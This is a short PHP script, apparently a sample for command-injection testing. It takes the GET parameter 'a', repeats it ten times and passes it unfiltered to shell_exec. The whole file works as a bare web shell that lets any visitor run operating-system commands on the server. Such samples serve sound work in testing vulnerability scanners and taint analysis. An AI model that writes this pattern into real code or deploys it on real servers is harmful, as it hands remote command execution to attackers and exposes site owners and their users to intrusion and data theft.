<?php

$d= $_GET['a'];
$a = "";
for($i=0;$i<10;$i++){
    $a .= $d;

}

shell_exec($a);